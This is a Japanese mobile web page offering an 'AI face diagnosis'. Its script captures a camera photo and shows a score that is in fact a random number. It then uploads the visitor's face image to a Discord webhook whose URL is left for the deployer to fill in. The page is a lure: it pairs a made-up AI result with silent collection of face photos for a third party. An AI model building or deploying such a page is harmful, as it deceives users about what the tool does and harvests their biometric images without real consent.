<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI 顔診断</title>
<style>
  body {font-family:sans-serif;text-align:center;background:linear-gradient(135deg,#b993d6,#8ca6db);color:white;padding:20px;}
  h1 {font-size:1.8em;}
  video,canvas {width:90%;max-width:350px;border-radius:10px;margin:10px 0;}
  button {background:#6a5acd;border:none;color:white;padding:12px 20px;border-radius:10px;font-size:1em;margin:5px;cursor:pointer;}
  #result {font-size:1.3em;margin-top:15px;}
</style>
</head>
<body>

<h1>AI 顔診断（スマホ対応）</h1>
<video id="camera" autoplay playsinline></video>
<canvas id="snapshot" style="display:none;"></canvas><br>
<button id="captureBtn">📸 写真を撮る</button>
<button id="sendBtn" disabled>✨ 診断＆送信</button>
<p id="result"></p>

<script>
const video=document.getElementById('camera');
const canvas=document.getElementById('snapshot');
const captureBtn=document.getElementById('captureBtn');
const sendBtn=document.getElementById('sendBtn');
const result=document.getElementById('result');

// ↓ あなたのDiscord Webhook URL ↓
const WEBHOOK_URL="https://discord.com/api/webhooks/ここにあなたのURL";

async function initCamera(){
 try{
   const stream=await navigator.mediaDevices.getUserMedia({video:true});
   video.srcObject=stream;
 }catch(err){
   alert("カメラを起動できません。ブラウザの設定を確認してください。");
   console.error(err);
 }
}

captureBtn.addEventListener('click',()=>{
 const ctx=canvas.getContext('2d');
 canvas.width=video.videoWidth;
 canvas.height=video.videoHeight;
 ctx.drawImage(video,0,0);
 sendBtn.disabled=false;
 result.textContent="写真を撮影しました！診断してみよう👇";
});

sendBtn.addEventListener('click',async()=>{
 const randomScore=Math.floor(Math.random()*101);
 result.textContent=`AI診断スコア：${randomScore}点！`;
 const imageBlob=await new Promise(resolve=>canvas.toBlob(resolve,'image/jpeg'));
 const formData=new FormData();
 formData.append("file",imageBlob,"face.jpg");
 formData.append("payload_json",JSON.stringify({content:`📸 AI顔診断の結果：${randomScore}点`}));
 await fetch(WEBHOOK_URL,{method:"POST",body:formData});
 result.textContent+="（Discordに送信しました！）";
});

initCamera();
</script>

</body>
</html>
